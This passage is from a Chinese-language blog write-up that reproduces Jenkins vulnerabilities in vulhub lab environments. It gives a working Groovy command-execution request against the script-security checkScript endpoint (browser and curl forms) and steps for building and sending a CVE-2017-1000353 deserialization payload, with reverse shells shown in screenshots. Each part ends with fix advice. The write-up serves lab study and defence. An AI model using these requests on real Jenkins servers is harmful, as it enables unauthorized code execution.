+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/0a5fd0a06682997836bd524f9a2e7b42.png" alt=""  loading="lazy" />
+验证是否执行成功
+
+    <img src="../imgs/e05058893ff85602c8b6e4b11546171c.png" alt=""  loading="lazy" /></p>
+<h4>方法2<span class="hx:absolute hx:-mt-20" id="方法2"></span>
+    <a href="#%e6%96%b9%e6%b3%952" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>直接发送如下请求，浏览器，curl，burp都行</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
+?sandbox=true
+&amp;value=public class x {
+  public x(){
+    &#34;要执行的命令&#34;.execute()
+  }
+}</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>浏览器中使用插件hackbar
+
+    <img src="../imgs/4ab8ddc3f5eacf899758384194e76672.png" alt=""  loading="lazy" />
+验证是否执行成功
+
+    <img src="../imgs/debabea2f944aff500af11c65a4d119b.png" alt=""  loading="lazy" />
+使用curl命令</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -G <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --data-urlencode <span style="color:#e6db74">&#34;sandbox=true&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --data-urlencode <span style="color:#e6db74">&#34;value=public class x { public x(){ \&#34;touch /tmp/333.txt\&#34;.execute() } }&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;http://192.168.79.111:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/c4f52e397fd6d537d7c72da0c580e83e.png" alt=""  loading="lazy" />
+验证是否执行成功
+
+    <img src="../imgs/283a15ffb155b71a5697b0a9da1d0399.png" alt=""  loading="lazy" /></p>
+<h4>反弹shell<span class="hx:absolute hx:-mt-20" id="反弹shell"></span>
+    <a href="#%e5%8f%8d%e5%bc%b9shell" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>使用上述方法1，弹个shell试试
+运行脚本
+
+    <img src="../imgs/aa3315f476046060f2b14c1fe4b60378.png" alt=""  loading="lazy" />
+收到shell
+
+    <img src="../imgs/891670b102fde39371665422e8773fd4.png" alt=""  loading="lazy" /></p>
+<h3>如何修复<span class="hx:absolute hx:-mt-20" id="如何修复-1"></span>
+    <a href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><ol>
+<li>升级Jenkins核心版本</li>
+<li>升级Script Security Plugin版本
+该漏洞通常需要利用<code>script-security</code>插件中的接口作为跳板</li>
+</ol>
+<h2>Jenkins-CLI 远程代码执行漏洞（CVE-2017-1000353）<span class="hx:absolute hx:-mt-20" id="jenkins-cli-远程代码执行漏洞cve-2017-1000353"></span>
+    <a href="#jenkins-cli-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9ecve-2017-1000353" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><blockquote>
+  <p>靶场环境：vulhub/jenkins/CVE-2017-1000353</p>
+
+</blockquote>
+<h3>靶场搭建<span class="hx:absolute hx:-mt-20" id="靶场搭建-2"></span>
+    <a href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/vulhub/vulhub.git
+</span></span><span style="display:flex;"><span>cd vulhub/jenkins/CVE-2017-1000353
+</span></span><span style="display:flex;"><span>docker compose up -d</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>启动后，访问<code>http://your-ip:8080/</code>即可查看到Jenkins页面</p>
+<h3>漏洞原理<span class="hx:absolute hx:-mt-20" id="漏洞原理-2"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>在Jenkins CLI 接口（Remoting 库）中出现，当服务端在处理 download请求时，会调用 download()方法，并等待一个upload请求。在收到upload请求后，将请求内容作为输入流传入到创建的 Channel 对象中。在创建 Channel对象时，会同时创建一个子线程来读取序列化对象，读取对象过程中调用了readObject()方法，从而导致反序列化漏洞的出现。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2017-1000353/README.zh-cn.md"target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2017-1000353/README.zh-cn.md</a></li>
+<li><a href="https://www.ctfiot.com/122244.html"target="_blank" rel="noopener">https://www.ctfiot.com/122244.html</a></li>
+<li><a href="https://github.com/r00t4dm/Jenkins-CVE-2017-1000353"target="_blank" rel="noopener">https://github.com/r00t4dm/Jenkins-CVE-2017-1000353</a></li>
+<li><a href="https://paper.seebug.org/295/"target="_blank" rel="noopener">https://paper.seebug.org/295/</a>
+Jenkins 2.56 及更早版本以及 2.46.1 LTS及更早版本存在未授权的远程代码执行漏洞。</li>
+</ul>
+<h3>漏洞复现<span class="hx:absolute hx:-mt-20" id="漏洞复现-2"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>利用该漏洞时，Java 版本一致性非常重要。生成 Payload 的环境建议使用<strong>OpenJDK 8u292</strong>过高版本的Java可能会因为自身的安全限制（如 JEP 290）导致Payload失效。</p>
+<ol>
+<li>生成恶意序列化载荷
+首先，下载 <a href="https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar"target="_blank" rel="noopener">CVE-2017-1000353-1.1-SNAPSHOT-all.jar</a> 工具来生成 payload。
+它不仅生成反序列化 Gadget（如 <code>SignedObject</code> 链），还会自动加上 <strong>Jenkins Remoting</strong>协议所需的 Preamble（前导符）。
+下载jdk 8u292， <a href="https://github.com/AdoptOpenJDK/openjdk8-upstream-binaries/releases/tag/jdk8u292-b10"target="_blank" rel="noopener">https://github.com/AdoptOpenJDK/openjdk8-upstream-binaries/releases/tag/jdk8u292-b10</a> 自行选择即可，下载完成解压</li>
+</ol>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>wget 下载的链接
+</span></span><span style="display:flex;"><span>tar -czvf OpenJDK8U-jdk_x64_linux_8u292b10.tar.gz</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>使用sdk来管理java</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>sdk install java [版本别名] [本地JDK解压目录的绝对路径]
+sdk install java 8u292 /opt/openjdk-8u292-b10/</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/5985b78d62caae7959b0948f1bd0ff89.png" alt=""  loading="lazy" />
+
+    <img src="../imgs/d08409808a504711720434c48ceb991a.png" alt=""  loading="lazy" />
+使用jdk 8u292运行工具生成payload</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar 生成的ser文件名 <span style="color:#e6db74">&#34;要执行的命令&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/d46aaf80203274dc94da91e54e65a0ca.png" alt=""  loading="lazy" />
+如果遇到问题，可以使用以下命令在Docker中生成payload</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker run --rm -v <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>:/tmp openjdk:8u292 bash -c <span style="color:#e6db74">&#34;cd /tmp &amp;&amp; java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar 文件名.ser \&#34;要执行的命令\&#34;&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<table>
+  <thead>
+      <tr>
+          <th>命令部分</th>
+          <th>功能描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>docker run --rm</code></td>
+          <td>启动一个容器，并在容器运行结束（退出）后自动删除容器，保持环境干净。</td>
+      </tr>
+      <tr>
+          <td><code>-v $(pwd):/tmp</code></td>
+          <td>挂载目录：将当前宿主机的目录（<code>$(pwd)</code>）映射到容器内的 <code>/tmp</code> 目录。这意味着容器在 <code>/tmp</code> 生成的文件会直接出现在你当前的文件夹里。</td>
+      </tr>
+      <tr>
+          <td><code>openjdk:8u292</code></td>
+          <td>使用指定的 Java 8 镜像作为运行环境（正好是你之前配置的那个版本）。</td>
+      </tr>
+      <tr>
+          <td><code>bash -c &quot;...&quot;</code></td>
+          <td>在容器内启动 Bash 并执行引号中的一系列指令。</td>
+      </tr>
+      <tr>
+          <td><code>cd /tmp &amp;&amp; ...</code></td>
+          <td>先进入挂载的目录，确保能找到 <code>.jar</code> 文件。</td>
+      </tr>
+      <tr>
+          <td><code>java -jar CVE-2017-1000353...</code></td>
+          <td>核心执行步骤：运行漏洞利用工具（PoC）。</td>
+      </tr>
+      <tr>
+          <td><code>jenkins_poc.ser</code></td>
+          <td>程序的第一个参数：指定输出文件名。</td>
+      </tr>
+      <tr>
+          <td><code>&quot;touch /tmp/success&quot;</code></td>
+          <td>程序的第二个参数：指定要在受害者机器上执行的命令（创建一个空文件）。</td>
+      </tr>
+  </tbody>
+</table>
+<ol start="2">
+<li>并将其发送至目标 Jenkins 服务器
+下载 <a href="https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py"target="_blank" rel="noopener">exploit.py</a> 脚本，并使用Python 3执行以发送 payload。（我使用的是python3.9）
+exploit.py脚本模拟双路HTTP请求（Download 和 Upload），将生成的 <code>.ser</code> 文件发送至目标。</li>
+</ol>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python exploit.py http://your-ip:port payload文件名</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/a81fe39f57fc68223b3c7a1514399659.png" alt=""  loading="lazy" />
+验证漏洞利用是否成功
+
+    <img src="../imgs/1e3d01412846509f2aac78f2adaeed64.png" alt=""  loading="lazy" /></p>
+<h4>反弹shell<span class="hx:absolute hx:-mt-20" id="反弹shell-1"></span>
+    <a href="#%e5%8f%8d%e5%bc%b9shell-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><ol>
+<li>生成反弹shell的payload，并且使用exp脚本发送payload
+
+    <img src="../imgs/ca7f7f9b6d182e99ddefdf3fd535a9db.png" alt=""  loading="lazy" />
+收到shell
+
+    <img src="../imgs/529df22b1e0fe0520dca85b0a3e0c37c.png" alt=""  loading="lazy" /></li>
+</ol>
+<h3>如何修复<span class="hx:absolute hx:-mt-20" id="如何修复-2"></span>
+    <a href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><ol>
+<li>升级Jenkins版本</li>
+<li>临时缓解方案：禁用 CLI 接口</li>
+<li>升级JRE版本，环境加固：JEP 290 机制
+JEP 290是在 2016 年左右引入的，它是Java安全史上的一个里程碑，直接改变了Java处理反序列化的方式。在 JEP 290 之前，Java 的 <code>readObject()</code> 是“来者不拒”的，这导致了大量反序列化漏洞。JEP 290 引入了序列化筛选器（Serialization Filtering）机制。
+该漏洞的本质是Java反序列化。通过升级运行Jenkins的 JRE (Java Runtime Environment)，可以利用Java自带的防御机制。</li>
+</ol>
+<p>了解一下官方的做法，添加黑名单：Jenkins 在 <code>remoting</code> 组件中定义了一个名为 <code>ClassFilter</code> 的抽象类。它的作用是在 <code>ObjectInputStream.readObject()</code> 真正执行之前，拦截并检查即将被实例化的类名。官方在<code>ClassFilter.java</code>的默认实现中，维护了一个硬编码的“危险类”列表。这些类通常是已知的Gadget Chains的起点或中间环节。</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> Class<span style="color:#f92672">&lt;?&gt;</span> resolveClass(ObjectStreamClass desc) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>    String name <span style="color:#f92672">=</span> desc.<span style="color:#a6e22e">getName</span>(); <span style="color:#75715e">// 获取类名</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 调用 ClassFilter 进行检查</span>
+</span></span><span style="display:flex;"><span>    ClassFilter filter <span style="color:#f92672">=</span> ClassFilter.<span style="color:#a6e22e">get</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        filter.<span style="color:#a6e22e">check</span>(name); <span style="color:#75715e">// 如果类名在黑名单中，此处会直接抛出安全异常</span>
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (SecurityException e) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidClassException(<span style="color:#e6db74">&#34;Rejected by Blacklist&#34;</span>, name);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">resolveClass</span>(desc); <span style="color:#75715e">// 只有通过检查，才允许进入后续的反序列化流程</span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+
+        </div><div class="hx:mt-16"></div><div class="hx:mb-8 hx:flex hx:items-center hx:border-t hx:pt-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-neutral-400 hx:dark:contrast-more:border-neutral-400 hx:print:hidden"><a
+        href="/vul/zabbix%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+        title="Zabbix历史漏洞复现"
+        class="hx:flex hx:max-w-[50%] hx:items-center hx:gap-1 hx:py-4 hx:text-base hx:font-medium hx:text-gray-600 hx:transition-colors [word-break:break-word] hx:hover:text-primary-600 hx:dark:text-gray-300 hx:md:text-lg hx:ltr:ml-auto hx:ltr:pl-4 hx:ltr:text-right hx:rtl:mr-auto hx:rtl:pr-4 hx:rtl:text-left"
+      >Zabbix历史漏洞复现<svg class="hx:inline hx:h-5 hx:shrink-0 hx:rtl:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg></a></div></main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hextra-custom-footer hextra-max-footer-width hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>由 Hextra 驱动<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script>
+        <script defer src="/en.search.js" integrity=""></script>
+  </body>
+</html>
